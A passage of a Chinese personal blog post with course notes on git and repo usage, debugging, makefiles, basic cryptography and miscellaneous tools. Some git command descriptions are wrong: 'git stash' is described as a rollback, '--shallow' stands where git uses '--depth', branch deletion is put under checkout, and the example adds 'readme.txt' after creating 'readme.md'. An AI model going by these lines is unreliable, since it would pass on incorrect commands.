<li>顶层root，文件夹抽象为<code>tree</code>, 文件抽象为<code>blob</code></li>
<li>commit: 每次commit 产生一个类似 <code>snapshot(快照)</code>的东西，保存当前的状态以及一些信息(作者，描述…)。</li>
<li>通过 <code>mapping&lt;string, object&gt;</code> 进行管理.string指文件的哈希值(SHA-1)，object是我们文件保存的地址(‘snapshot’在磁盘中的地址)。每次修改，commit会产生新的hash</li>
</ul>
</li>
<li><p>reference: git需要的是文件的哈希值，对于人类毫无意义，因此存在另一个 <code>mapping&lt;string, string&gt;</code> 。我们使用可以人类方便阅读的字符串，映射到hash，然后在寻找到文件</p>
</li>
<li><p>git 几个状态，可以看看 <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Git工作流和核心原理</a>，非常有趣。在学习时，可以想象一下有向无环图进行理解。</p>
<ul>
<li>工作区</li>
<li>暂存区</li>
<li>本地仓库</li>
<li>远程仓库</li>
</ul>
</li>
<li><p>git 的配置</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置用户名，邮箱。自己的账户。</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>创建一个git仓库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment"># 本地仓库初始化，出现一个 `.git` 的目录</span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># 查看仓库状态，非常常用</span></span><br></pre></td></tr></table></figure>

<ul>
<li>日志，查看提交的文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># oneline 去除一定的信息</span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate --oneline</span><br></pre></td></tr></table></figure>

<ul>
<li><p>其中存在一个 <code>HEAD</code> 指针指向当前工作的分支。</p>
</li>
<li><p>我们想忽略某些文件时</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 gitignore 文件配置</span></span><br><span class="line"><span class="built_in">touch</span> .gitignore</span><br><span class="line"></span><br><span class="line">*.jpg   <span class="comment"># 忽略所有的 jpg文件</span></span><br></pre></td></tr></table></figure>
<ul>
<li>本地操作</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># 写点新文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> &gt; readme.md  <span class="comment"># 处于untracked 状态，使用git status 会存在提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暂存区</span></span><br><span class="line">git add readme.txt       <span class="comment"># 处于tracked 状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 提交到本地仓库</span></span><br><span class="line">git commit  <span class="comment"># 进入文件，进行描述修改的内容</span></span><br><span class="line">	-m <span class="string">&quot;message&quot;</span>  <span class="comment"># message 代表描述，简短描述可以这样使用</span></span><br></pre></td></tr></table></figure>


<ul>
<li>提交到远程代码仓库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. 远程创建后直接clone下来，然后再写内容</span></span><br><span class="line">git <span class="built_in">clone</span> <span class="string">&quot;your-repo&quot;</span></span><br><span class="line">git remote -v   <span class="comment"># 查看和那些仓库有联系</span></span><br><span class="line">git push        <span class="comment"># 有.git文件夹，可以找到仓库提交</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 我们在本地写了很多文件，但是中途想起来没有使用git，我们如何做？</span></span><br><span class="line"><span class="comment">## 还是需要先创建仓库</span></span><br><span class="line"><span class="comment">## 然后再本地</span></span><br><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit</span><br><span class="line">git remote add <span class="string">&quot;name&quot;</span> git@&lt;your-repo&gt;  <span class="comment"># 关联远程仓库。</span></span><br><span class="line">							<span class="comment"># name 自己取，可以关联很多仓库，根据名字区分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 但是本地仓库一般是master，某些平台是main(也可以选，但是默认是main)，这一步可能出错，需要切换分支 `git checkout -b main`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 远程分支不存在会创建一个</span></span><br><span class="line">git push <span class="string">&quot;仓库名称&quot;</span> <span class="string">&quot;本地分支名&quot;</span>:<span class="string">&quot;远程分支名&quot;</span>   <span class="comment"># 如果本地分支名与远程分支名相同，则可以省略冒号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 删除远程仓库</span></span><br><span class="line">git remote <span class="built_in">rm</span> <span class="string">&quot;仓库名&quot;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>从远程仓库到工作区。比如团队合作中，远程仓库更新了，我们需要先同步。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接同步到本地，会直接更新本地文件</span></span><br><span class="line">git pull</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于pull 一步到位，也可分步进行</span></span><br><span class="line"><span class="comment">## 先更新到到本地仓库</span></span><br><span class="line">git fetch</span><br><span class="line"><span class="comment">## diff 对比区别</span></span><br><span class="line">git diff </span><br><span class="line">    <span class="comment"># 查看本地仓库和工作区的区别</span></span><br><span class="line"><span class="comment">## pull 合并 = git fetch + git merge</span></span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>


<ul>
<li><p>分支操作。我们参与开源项目时，建议创建一个新分支push，由项目负责人决定是否合并(merge)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch <span class="string">&quot;name&quot;</span>  <span class="comment"># 创建一个分支 </span></span><br><span class="line">		-vv   <span class="comment"># 查看分支信息</span></span><br><span class="line"></span><br><span class="line">git checkout <span class="string">&quot;name&quot;</span>  <span class="comment"># 切换分支</span></span><br><span class="line">		-d <span class="string">&quot;name&quot;</span>    <span class="comment"># 删除分支</span></span><br><span class="line">		-D <span class="string">&quot;name&quot;</span>    <span class="comment"># 暴力删除</span></span><br><span class="line">		-b <span class="string">&quot;name&quot;</span>    <span class="comment"># 创建一个分支然后切换</span></span><br><span class="line"></span><br><span class="line">git merge      <span class="comment"># 将别的分支合并到 `当前分支` 中</span></span><br><span class="line">		<span class="comment"># 可能会存在冲突，在某一个相同的位置存在不同的内容.保存的话，自己决定然后修改冲突文件就行</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>git clone 会复制远程的所有文件，包含其所有的 <code>snapshot</code> 我们可以使用 <code>--shallow</code> 忽略这些</p>
</li>
<li><p>git 回滚：当我们在一个分支中<code>commit</code>后发现一个巨大的错误，需要回退到之前的版本。改变 <code>HEAD</code> 指针</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash   <span class="comment"># 回退到上一个commit 版本</span></span><br><span class="line">git bisect  <span class="comment"># 比较强大的工具</span></span><br><span class="line"></span><br><span class="line">git reset </span><br><span class="line">		--hard         <span class="comment"># 会丢失最新的代码修改</span></span><br><span class="line">		--soft         <span class="comment"># 将 HEAD 指针回退到指定提交，不改变暂存区和工作区的内容</span></span><br><span class="line">		</span><br><span class="line">			HEAD^       <span class="comment"># 上一个 版本</span></span><br><span class="line">			HEAD~&lt;num&gt;  <span class="comment"># 回退num个版本</span></span><br><span class="line">			&lt;<span class="built_in">hash</span>&gt;      <span class="comment"># 回退到指定哈希值的版本</span></span><br><span class="line"></span><br><span class="line">git revert -n <span class="built_in">hash</span>   <span class="comment"># 将版本复制一份，不会销毁</span></span><br></pre></td></tr></table></figure>

</li>
<li><p>现在的IDE中存在git相关的工具，也更加方便了我们的使用。</p>
</li>
<li><p>也存在其余的版本控制工具，svn, repo……</p>
</li>
</ul>
<h3 id="repo-使用"><a href="#repo-使用" class="headerlink" title="repo 使用"></a>repo 使用</h3><ul>
<li><p><a href="https://source.android.google.cn/docs/setup/create/repo?hl=zh-cn#start">repo</a> 更适合多个仓库的管理，平常我们见的项目都是一个仓库。但是向Android这样的依赖上百个git仓库来说，依靠git并不是多么好使用，因此google 开发了repo工具，本质是一个python脚本，基于git。</p>
</li>
<li><p>初始化</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init</span><br><span class="line">	-u git@&lt;repo&gt;/mainfest.git  <span class="comment"># 默认为google的仓库 https://gerrit.googlesource.com/git-repo</span></span><br><span class="line">								<span class="comment"># 这个目录下最简单只需要 default.xml</span></span><br><span class="line">	-b  <span class="comment"># 指定branch</span></span><br></pre></td></tr></table></figure>

<ul>
<li>-u后的仓库, xml文件(默认<code>default.xml</code>, 我们可以自己选择)，然后我们拉取的时候会将所有的git仓库拉取下来</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo init -u &lt;repo&gt;</span><br><span class="line">	-m 指定xml文件</span><br></pre></td></tr></table></figure>

<ul>
<li>拉取代码到本地</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo <span class="built_in">sync</span> -c</span><br></pre></td></tr></table></figure>

<ul>
<li>分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">repo branch  <span class="comment"># 查看分支</span></span><br><span class="line"></span><br><span class="line">repo start &lt;branch_name&gt; --all <span class="comment"># 创建分支并进入</span></span><br></pre></td></tr></table></figure>

<h2 id="lecture7-debugging-profiling"><a href="#lecture7-debugging-profiling" class="headerlink" title="lecture7: debugging &amp; profiling"></a>lecture7: debugging &amp; profiling</h2><blockquote>
<p>调试程序以及性能分析</p>
</blockquote>
<ul>
<li><p>查看日志，打印日志，制作日志</p>
</li>
<li><p>调试器</p>
<ul>
<li>GNU gdb，可以调试几乎所有的二进制程序</li>
<li>python pdb，python调试</li>
<li>浏览器调试js</li>
</ul>
</li>
<li><p>性能测试</p>
<ul>
<li>测试一个程序运行 time</li>
</ul>
</li>
</ul>
<h2 id="lecture8-metaprogramming"><a href="#lecture8-metaprogramming" class="headerlink" title="lecture8: metaprogramming"></a>lecture8: metaprogramming</h2><ul>
<li><p>如何更高的管理项目、测试、依赖管理。使用 <code>makefile</code></p>
</li>
<li><p>makefile 的使用比较简单。</p>
</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">目标: 依赖</span></span><br><span class="line">	命令  //前面必须是tab键</span><br><span class="line"></span><br><span class="line"><span class="section">main: main.c</span></span><br><span class="line">	gcc main.c -o mian</span><br></pre></td></tr></table></figure>

<ul>
<li>一些语法</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$^</span>   所有的依赖项</span><br><span class="line"><span class="variable">$&lt;</span>   一个依赖项</span><br><span class="line"><span class="variable">$@</span>   目标文件</span><br><span class="line">echo 打印</span><br><span class="line">%    通配符</span><br><span class="line">*    也是通配符</span><br></pre></td></tr></table></figure>

<ul>
<li>我们编译某些开源项目时也会使用 <code>make</code> 命令，可以看看别人怎么写的。</li>
<li>当然，还有其他的选择，比如 <code>cmake</code></li>
</ul>
<h2 id="lecture9-security-crypto"><a href="#lecture9-security-crypto" class="headerlink" title="lecture9: security &amp; crypto"></a>lecture9: security &amp; crypto</h2><blockquote>
<p>安全很多，也是一门专门的学科，想要深入就需要学专业课</p>
</blockquote>
<ul>
<li><p>hash: 用作信息摘要，签名，检查文件的完整性。</p>
<ul>
<li>md5</li>
<li>sha-1&#x2F;2&#x2F;3</li>
</ul>
</li>
<li><p>对称加密</p>
<ul>
<li>DES</li>
<li>AES</li>
</ul>
</li>
<li><p>非对称加密</p>
<ul>
<li>RSA</li>
<li>ECC</li>
</ul>
</li>
<li><p>数字签名</p>
</li>
</ul>
<h2 id="lecture10-potpourri"><a href="#lecture10-potpourri" class="headerlink" title="lecture10: potpourri"></a>lecture10: potpourri</h2><blockquote>
<p>大杂烩：讲述一些概念，熟练还得在以后多练习</p>
</blockquote>
<ul>
<li><p>键盘映射</p>
<ul>
<li>键盘上的<code>Caps Lock</code>几乎不怎么使用，我们可以重新配置一下(比如比较小的Esc)，让其发挥作用</li>
</ul>
</li>
<li><p>守护进程，daemon</p>
</li>
<li><p>APIs</p>
<ul>
<li>比如说部分天气的API，我们只需要请求特定的URL带着正确的参数，我们就可以获得返回结果。</li>
</ul>
</li>
<li><p>命令行参数</p>
<ul>
<li>我们使用的命令可以带有参数</li>
</ul>
</li>
<li><p>Window Manage</p>
</li>
<li><p>VPN</p>
</li>
<li><p>Jupyter Notebook: 交互式编程</p>
</li>
<li><p>GitHub: 代码托管平台</p>
<ul>
<li>创建自己的仓库</li>
<li>提issue，解决问题</li>
<li>pr: pull request，自己写的提交给作者</li>
<li>merge 别人的请求</li>
</ul>
</li>
</ul>
<h2 id="lecture11-Q-A"><a href="#lecture11-Q-A" class="headerlink" title="lecture11: Q&amp;A"></a>lecture11: Q&amp;A</h2><blockquote>
<p>来自学生的问题</p>
</blockquote>
<ul>
<li>如何进行操作系统的学习？<ul>
<li>learn by exercise: 学习比较出名的 OS 课程，完成相应的lab，实现自己的OS</li>
</ul>
</li>
</ul>
<p>…… 自己看看就行</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>shell</tag>
        <tag>vim</tag>
        <tag>terminal</tag>
      </tags>
  </entry>
</search>
